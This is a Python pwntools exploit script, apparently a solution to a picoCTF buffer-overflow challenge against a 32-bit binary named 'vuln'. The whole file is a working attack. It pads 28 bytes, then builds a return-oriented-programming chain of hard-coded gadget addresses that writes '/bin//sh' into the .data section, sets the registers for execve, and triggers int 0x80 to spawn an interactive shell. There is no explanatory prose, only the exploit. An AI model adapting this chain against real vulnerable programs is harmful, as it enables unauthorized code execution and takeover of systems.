from struct import pack
from pwn import *

context.log_level = "Error"

io = process("./vuln")
# io = remote("saturn.picoctf.net", 52428)

# Padding goes here
p = b""
p += b"A" * 28
p += p32(0x080583B9)  # pop edx ; pop ebx ; ret
p += p32(0x080E5060)  # @ .data
p += p32(0x41414141)  # padding
p += p32(0x080B073A)  # pop eax ; ret
p += b"/bin"
p += p32(0x080590F2)  # mov dword ptr [edx], eax ; ret
p += p32(0x080583B9)  # pop edx ; pop ebx ; ret
p += p32(0x080E5064)  # @ .data + 4
p += p32(0x41414141)  # padding
p += p32(0x080B073A)  # pop eax ; ret
p += b"//sh"
p += p32(0x080590F2)  # mov dword ptr [edx], eax ; ret
p += p32(0x080583B9)  # pop edx ; pop ebx ; ret
p += p32(0x080E5068)  # @ .data + 8
p += p32(0x41414141)  # padding
p += p32(0x0804FB80)  # xor eax, eax ; ret
p += p32(0x080590F2)  # mov dword ptr [edx], eax ; ret
p += p32(0x08049022)  # pop ebx ; ret
p += p32(0x080E5060)  # @ .data
p += p32(0x08049E29)  # pop ecx ; ret
p += p32(0x080E5068)  # @ .data + 8
p += p32(0x080583B9)  # pop edx ; pop ebx ; ret
p += p32(0x080E5068)  # @ .data + 8
p += p32(0x080E5060)  # padding without overwrite ebx
p += p32(0x0804FB80)  # xor eax, eax ; ret
p += p32(0x0808054E)  # inc eax ; ret
p += p32(0x0808054E)  # inc eax ; ret
p += p32(0x0808054E)  # inc eax ; ret
p += p32(0x0808054E)  # inc eax ; ret
p += p32(0x0808054E)  # inc eax ; ret
p += p32(0x0808054E)  # inc eax ; ret
p += p32(0x0808054E)  # inc eax ; ret
p += p32(0x0808054E)  # inc eax ; ret
p += p32(0x0808054E)  # inc eax ; ret
p += p32(0x0808054E)  # inc eax ; ret
p += p32(0x0808054E)  # inc eax ; ret
p += p32(0x0804A3C2)  # int 0x80

io.sendline(p)
io.interactive()
